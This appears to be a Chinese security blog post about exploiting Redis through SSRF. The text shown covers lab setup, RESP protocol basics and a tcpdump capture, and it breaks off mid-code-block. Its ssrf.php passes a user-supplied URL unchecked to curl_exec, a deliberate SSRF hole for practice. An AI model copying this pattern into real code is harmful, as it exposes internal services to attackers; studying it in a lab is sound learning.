
<!DOCTYPE html><html lang="zh-CN">

<head>
  <meta charset="utf-8">
  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1" theme-name="Stellar" theme-version="1.28.1">
  
  <meta name="generator" content="Hexo 7.2.0">
  <meta http-equiv='x-dns-prefetch-control' content='on' />
  
  <meta name="renderer" content="webkit">
  <meta name="force-rendering" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  <meta name="HandheldFriendly" content="True" >
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f9fafb">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
  
  <title>ssrf打redis - hybcx's blog</title>

  
    <meta name="description" content="0x01 SSRF介绍 SSRF，服务器端请求伪造，是由攻击者构造的漏洞，用于形成服务器发起的请求。通常，SSRF攻击的目标是外部网络无法访问的内部系统。今天学习一手redis中如何利用SSRF，感觉这个在实战中不怎么常见，但其中的知识值得学习 0x02 环境搭建 这里在又是废了一天搭建成功，建议大家还是直接下载redis-server服务搭建比较好，网上的教程属实是有点垃圾且害人 这里我的版本的">
<meta property="og:type" content="article">
<meta property="og:title" content="ssrf打redis">
<meta property="og:url" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/index.html">
<meta property="og:site_name" content="hybcx&#39;s blog">
<meta property="og:description" content="0x01 SSRF介绍 SSRF，服务器端请求伪造，是由攻击者构造的漏洞，用于形成服务器发起的请求。通常，SSRF攻击的目标是外部网络无法访问的内部系统。今天学习一手redis中如何利用SSRF，感觉这个在实战中不怎么常见，但其中的知识值得学习 0x02 环境搭建 这里在又是废了一天搭建成功，建议大家还是直接下载redis-server服务搭建比较好，网上的教程属实是有点垃圾且害人 这里我的版本的">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231229142247812.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231228175523608.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231228175629190.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231228175746108.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231228180421235.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231228190902772.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231228191343559.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231228190902772.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231228191343559.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231228202542781.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231228202916199.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231228203032489.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231228203105346.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231229142501547.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231229142516461.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231229142530303.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231229143001471.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231229143034128.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231229143701556.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231229144834957.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231229145130446.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231229145722322.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231229145749212.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231229152354736.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231229152242287.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231229152446308.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231229152024436.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231229151825806.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231229153219790.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231229155122022.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231229155515379.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231229160136094.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231229160148389.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231229162001398.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231229163154621.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231229163317518.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231229163432449.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231229163812136.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231229164232337.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231229215205554.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231229220359116.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231229220743984.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231229221144741.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231229221135874.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231230161304017.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231230161411475.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231230161948095.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231230162228324.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231230165445669.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231230172330268.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231230172356029.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231230172618573.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231230172917747.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231230172959844.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231230190041291.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231230194558436.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231230194640807.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231230194648625.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231230205726243.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231231145729676.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231231150520292.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231231150543048.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231231150910443.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231231151343200.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231231151722586.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231231152152338.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231231152421261.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231231152729324.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231231152918892.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231231152940854.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231231153015380.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231231154011663.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231231155336238.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231231155534328.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231231155539276.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231231155623106.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231231160714720.png">
<meta property="article:published_time" content="2023-12-27T12:20:54.722Z">
<meta property="article:modified_time" content="2024-03-31T01:00:46.358Z">
<meta property="article:author" content="hybcx">
<meta property="article:tag" content="基础知识">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/image-20231229142247812.png">
  
  
  
  <meta name="keywords" content="基础知识">

  <!-- feed -->
  
    <link rel="alternate" href="/atom.xml" title="hybcx's blog" type="application/atom+xml">
  

  <link rel="stylesheet" href="/css/main.css?v=1.28.1">

  
    <link rel="shortcut icon" href="/medias/logo.png">
  

  
    
<link rel="stylesheet" href="https://gcore.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/styles/atom-one-dark.min.css">

  

  <link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'">

<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>
<body>

<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">


<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">hybcx's blog</div><div class="sub normal cap">人生当是精彩的</div><div class="sub hover cap" style="opacity:0"> 何必忧虑未来！</div></a></div></header>

<div class="nav-area">
<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>


<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="友链" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
</div>
<div class="widgets">


<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2024/03/26/gdouctf-2023/"><span class="title">GDOUCTF2023</span></a><a class="item title" href="/2024/03/29/i-chun-qiu-shua-ti-ji-lu/"><span class="title">i春秋CTF刷题</span></a><a class="item title" href="/2024/04/30/hnctf-2022/"><span class="title">HNCTF2022</span></a><a class="item title" href="/2024/05/02/misc-shua-ti-zhi-lu/"><span class="title">MISC-刷题之旅</span></a><a class="item title" href="/2024/03/24/shell-xue-xi/"><span class="title">shell学习</span></a><a class="item title" href="/2023/08/06/qian-xi-ssti-lou-dong/"><span class="title">浅析SSTI漏洞</span></a><a class="item title" href="/2024/03/29/thm-jin-gong-xing-shen-tou-ce-shi/"><span class="title">THM-进攻性渗透测试</span></a><a class="item title" href="/2023/11/12/flask-pin-ma-xue-xi/"><span class="title">Flask-PIN码学习</span></a><a class="item title" href="/2024/04/23/php-xue-xi-zong-jie/"><span class="title">PHP学习总结</span></a><a class="item title" href="/2024/04/15/uuctf-2022/"><span class="title">UUCTF_2022</span></a></div></widget>
</div>
<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/hybchenxing/" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/github-logo2.png"/></a><a class="social" href="https://music.163.com/#/user/home?id=9895561810" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/neteasemusic-icon.png"/></a><a class="social" href="https://space.bilibili.com/1761635300" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/bilibili-icon.png"/></a><a class="social" href="https://muselink.cc/hybcx" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/weChat.png"/></a><a class="social" href="javaScript:void('永夜');" rel="noopener noreferrer"><img class="lazy" id="ThemeM" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/moon.svg"/></a><a class="social" href="javaScript:void('永昼');" rel="noopener noreferrer"><img class="lazy" id="ThemeL" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/sun.svg"/></a></div></footer>
</div></aside><div class="l_main" id="main">





<div class="article banner top">
  <div class="content">
    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/">web知识总结</a></div>
<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2023-12-27T12:20:54.722Z">2023-12-27</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-03-31T01:00:46.358Z">2024-03-31</time></span></div></div></div>
    
    <div class="bottom only-title">
      
      <div class="text-area">
        <h1 class="text title"><span>ssrf打redis</span></h1>
        
      </div>
    </div>
    
  </div>
  </div><article class="md-text content"><h1 id="0x01-ssrf介绍">0x01 SSRF介绍</h1>
<p>SSRF，服务器端请求伪造，是由攻击者构造的漏洞，用于形成服务器发起的请求。通常，SSRF攻击的目标是外部网络无法访问的内部系统。今天学习一手redis中如何利用SSRF，感觉这个在实战中不怎么常见，但其中的知识值得学习</p>
<h1 id="0x02-环境搭建">0x02 环境搭建</h1>
<p>这里在又是废了一天搭建成功，建议大家还是直接下载redis-server服务搭建比较好，网上的教程属实是有点垃圾且害人</p>
<p>这里我的版本的<code>ubuntu22.04 LTS</code></p>
<pre><code class="hljs sh">安装Redis：
apt-get install redis-server

修改Redis配置文件（设置密码，监听ip等）：
vim /etc/redis/redis.conf
配置监听ip：
<span class="hljs-built_in">bind</span> 127.0.0.1 ::1<span class="hljs-comment">#只监听本地端口，如果需要远程登录可以在后面加上本机的ip，同时远程登录也可能造成未授权访问。</span>
配置默认密码：
<span class="hljs-comment">#requirepass foobared#默认无密码，要设置密码可以将前面的#删除，然后将foobared改为要设置的密码。</span>

启动Redis：
/bin/redis-server /etc/redis/redis.conf
或者
service redis-server start<span class="hljs-comment">#这种方法启动可能会造成Redis在web目录、计划任务目录、.ssh目录等其他一些目录没有写入的权限，就算是root身份启动，文件夹777权限也不行（就很迷）。如果遇到Redis在执行save时报错，就还是试试root身份第一种方法启动吧。</span></code></pre>
<p>第二天了，你没猜错，这玩意儿tm又废了我一天时间搭建，最终还是选择centos7搭建成功</p>
<p>具体可以参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/242692.html">Redis环境搭建</a>、<a target="_blank" rel="noopener" href="https://blog.csdn.net/a158640927/article/details/129717051?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=centos7%E6%90%AD%E5%BB%BAapache%20php&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-129717051.142%5Ev99%5Epc_search_result_base2&amp;spm=1018.2226.3001.4187">CentOS7 搭建php环境 </a>–只需要将其中的php、apache服务安装好即可，最后记得在防火墙开启所需要的端口。其中ssrf.php代码如下：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>(); <span class="hljs-comment">//创建新的 cURL 资源</span>
<span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'url'</span>]); <span class="hljs-comment">//设置URL 和相应的选项</span>
<span class="hljs-comment"># curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span>
<span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);
<span class="hljs-comment"># curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span>
<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);   <span class="hljs-comment">//抓取 URL 内容并把它传递给浏览器，存储进文件</span>
<span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);  <span class="hljs-comment">//关闭 cURL 资源，并且释放系统资源</span>
<span class="hljs-meta">?&gt;</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231229142247812.png" alt="image-20231229142247812"></p>
<p>测试没毛病。</p>
<h1 id="0x03-前置知识">0x03 前置知识</h1>
<p>这里看到师傅们在探讨这一问题的时候需要学习一手RESP协议，那我们跟着师傅学一手</p>
<h2 id="resp协议">RESP协议</h2>
<p><code>Redis</code>服务器与客户端通过<code>RESP</code>（REdis Serialization Protocol）协议通信。</p>
<p>RESP协议是在Redis 1.2中引入的，但它成为了与Redis 2.0中的Redis服务器通信的标准方式。这是您应该在Redis客户端中实现的协议。</p>
<p>RESP实际上是一个支持以下数据类型的序列化协议：简单字符串，错误，整数，批量字符串和数组。</p>
<p>RESP在Redis中用作请求 - 响应协议的方式如下：</p>
<ol>
<li>客户端将命令作为<code>Bulk Strings</code>的RESP数组发送到Redis服务器。</li>
<li>服务器根据命令实现回复一种RESP类型。</li>
</ol>
<p>在RESP中，某些数据的类型取决于第一个字节：</p>
<pre><code class="hljs plaintext">对于`Simple Strings`，回复的第一个字节是`+`
对于`error`，回复的第一个字节是`-`
对于`Integer`，回复的第一个字节是`:`
对于`Bulk Strings`，回复的第一个字节是`$`
对于`array`，回复的第一个字节是`*`
此外，`RESP`能够使用稍后指定的`Bulk Strings`或`Array`的特殊变体来表示`Null`值。</code></pre>
<p>在RESP中，协议的不同部分始终以<code>"\r\n"(CRLF)</code>结束。</p>
<p>我们用<code>tcpdump</code>来抓个客户端与redis服务器通信的包来分析一下</p>
<pre><code class="hljs sh">命令：tcpdump -i lo -s 0 port 6379 -w redis.pcap
参数说明：
-i指定网卡（一般指定eth0，这里抓取本地接口的流量需要指定为lo）
-s抓取数据包时默认抓取长度为68字节。加上-s 0 后可以抓到完整的数据包
